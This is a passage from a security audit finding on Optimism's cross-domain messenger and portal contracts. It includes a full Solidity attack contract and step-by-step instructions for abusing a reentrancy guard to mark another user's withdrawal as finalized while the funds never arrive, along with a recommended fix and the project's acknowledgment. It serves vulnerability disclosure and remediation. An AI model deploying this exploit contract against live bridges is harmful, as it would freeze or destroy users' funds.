This is possible due to presence of reentrancy guard on the function `relayMessage`.\n## Vulnerability Detail\n\n - Bob (a malicious user) creates a contract (called `AttackContract`) on L1. \n ```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.0;\n\nstruct WithdrawalTransaction {\n    uint256 nonce;\n    address sender;\n    address target;\n    uint256 value;\n    uint256 gasLimit;\n    bytes data;\n}\n\ninterface IOptimismPortal {\n    function finalizeWithdrawalTransaction(WithdrawalTransaction memory _tx)\n        external;\n}\n\ncontract AttackContract {\n    bool public donotRevert;\n    bytes metaData;\n    address optimismPortalAddress;\n\n    constructor(address _optimismPortal) {\n        optimismPortalAddress = _optimismPortal;\n    }\n\n    function enableRevert() public {\n        donotRevert = true;\n    }\n\n    function setMetaData(WithdrawalTransaction memory _tx) public {\n        metaData = abi.encodeWithSelector(\n            IOptimismPortal.finalizeWithdrawalTransaction.selector,\n            _tx\n        );\n    }\n\n    function attack() public {\n        if (!donotRevert) {\n            revert();\n        } else {\n            optimismPortalAddress.call(metaData);\n        }\n    }\n}\n\n```\n - Bob sends a message from L2 to L1 by calling the function `sendMessage` with the following parameters. He intends to call the function `attack()` through relaying the message from L2 to L1.\n   - `_target` = address of `AttackContract` on L1 \n   - `_message` = abi.encodeWithSignature(\"attack()\")\n   - `_minGasLimit` = just big enough so that the transaction can be executed\nhttps://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/universal/CrossDomainMessenger.sol#L212\n - On the L1 side, after challenge period and validation elapsed, the function `attack()` on contract `AttackContract` will be called during relaying the message.\nhttps://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/universal/CrossDomainMessenger.sol#L324\n -  But, since `donotRevert` is `false` in the contract `AttackContract`, the relayed message will be unsuccessful. So, we will have `failedMessages[versionedHash] = true`. It means that it is possible again to retry relaying the message later.\nhttps://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/universal/CrossDomainMessenger.sol#L331\n```solidity\n        if (!donotRevert) {\n            revert();\n        }\n```\n - Then, Bob calls the function `enableRevert` to set `donotRevert` to `true`. So that if later the function `attack()` is called again, it will not revert.\n```solidity\n    function enableRevert() public {\n        donotRevert = true;\n    }\n```\n - Then, Bob notices that Alice is withdrawing large amount of fund from L2 to L1. Her withdrawal transaction is proved but she is waiting for the challenge period to be finished to finalize it.\n - Then, Bob calls the function `setMetaData` on the contract `AttackContract` with the following parameter:\n   - `_tx` = Alice's withdrawal transaction\n  - By doing so, the `metaData` will be equal to `finalizeWithdrawalTransaction.selector` + Alice's withdrawal transaction.\n```solidity\n   function setMetaData(WithdrawalTransaction memory _tx) public {\n        metaData = abi.encodeWithSelector(\n            IOptimismPortal.finalizeWithdrawalTransaction.selector,\n            _tx\n        );\n    }\n```\n  - Now, after the challenge period is passed, and before the function `finalizeWithdrawalTransaction` is called by anyone (Alice), Bob calls the function `relayMessage` with the required data to retry his previous failed message again.\n  - This time, since `donotRevert` is `true`, the call to function `attack()` will not revert, instead the body of `else clause` will be executed.\n```solidity\n        else {\n            optimismPortalAddress.call(metaData);\n        }\n```\n  - In the `else clause`, it calls the function `finalizeWithdrawalTransaction` with Alice's withdrawal transaction as the parameter, to finalize Alice's transaction.\nhttps://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/L1/OptimismPortal.sol#L243\n - During finalizing Alice's withdrawal transaction, everything goes smoothly (as the challenge period is passed, and everything is valid) until the call to the function `relayMessage` in the contract `CrossDomainMessanger`.\n https://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/L1/OptimismPortal.sol#L324\n - Due to the reentrancy guard, the call will be unsuccessful.\nhttps://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/universal/CrossDomainMessenger.sol#L263\n - Please note that the flow is as follows:\n Bob ==> `CrossDomainMessenger.relayMessage` ==> `AttackContract.attack` ==> `OptimismPortal.finalizeWithdrawalTransaction` => `CrossDomainMessenger.relayMessage`\n - Since, the failed call is not handled during finalizing the message, the transaction will be finished without any error.\n - Then, Bob's relayed message transaction will be finished successfully.\n - By doing so, Alice's withdrawal transaction is flagged as finalized, but in reality it was not because of reentrancy guard. So, Alice loses her fund.\nhttps://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/L1/OptimismPortal.sol#L308\n\n\nIn summary the attack is as follows:\n1. Bob creates a malicious contract on L1 called `AttackContract`.\n2. Bob sends a message from L2 to L1 to call the function `AttackContract.attack` on L1.\n3. On L1 side, after the challenge period is passed, the function `AttackContract.attack` will be called.\n4. Message relay on L1 will be unsuccessful, because the function `AttackContract.attack` reverts. So, Bob's message will be flagged as failed message.\n5. Bob sets `AttackContract.donotRevert` to true.\n6. Bob waits for an innocent user to request withdrawal transaction.\n7. Bob waits for the innocent user's withdrawal transaction to be proved.\n8. Bob sets meta data in his malicious contract based on the innocent user's withdrawal transaction.\n9. Bob waits for the challenge period to be passed.\n10. After the challenge period is elapsed, Bob retries to relay his failed message again.\n11. `CrossDomainMessenger.relayMessage` will call the `AttackContract.attack`, then it calls `OptimismPortal.finalizeWithdrawalTransaction` to finalize innocent user's withdrawal transaction. Then, it calls `CrossDomainMessenger.relayMessage`, but it will be unsuccessful because of reentrancy guard.\n12. After finalizing the innocent user's withdrawal transaction, Bob's message will be flagged as successful. \n13. So, innocent user's withdrawal transaction is flagged as finalized, while it is not.   \n\n## Impact\nBy doing this attack it is possible to prevent users from withdrawing their fund. Moreover, they lose their fund because withdrawal is flagged as finalized, but the withdrawal sent to `L1CrossDomainMessanger` was not successful.\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\nMaybe it is better to use the following code instead of:\nhttps://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/L1/OptimismPortal.sol#L324-L329\n```solidity\n        try IL1CrossDomainMessanger.relayMessage(...) {} catch Error(string memory reason) {\n            if (\n                keccak256(abi.encodePacked(reason)) ==\n                keccak256(abi.encodePacked(\"ReentrancyGuard: reentrant call\"))\n            ) {\n                revert(\"finalizing should be reverted\");\n            }\n        }\n```\n\n## Discussion\n\n**rcstanciu**\n\nComment from Optimism\n\n---\n\n **Description:** Causing users lose their fund during finalizing withdrawal transaction\n\n\n **Reason:** This is a very creative exploit that takes advantage of the `L1CrossDomainMessenger`'s reentrancy guard on `relayMessage`. By creating an attack contract that reverts the first time a message is relayed by the `OptimismPortal` to the `L1CrossDomainMessenger`, but can be toggled to call `finalizeWithdrawalTransaction` for a **different** withdrawal transaction when the attacker replays it via the `L1CrossDomainMessenger`, the attacker can force the honest withdrawal's call to the `L1CrossDomainMessenger` to revert, effectively bricking it. PoC: [here](https://gist.github.com/clabby/018c8d64bff35da767a5a80e1f6d871d)\n\n\n **Action:** If a withdrawal transaction fails, we should check to see if the `_target` of the `WithdrawalTransaction` is the `L1CrossDomainMessenger`. If so, check if the call's revert data is the reentrancy guard message. If it is, we should revert the `finalizeWithdrawalTransaction` message and *NOT* mark the withdrawal as finalized.\n\n\n\n\n\n",
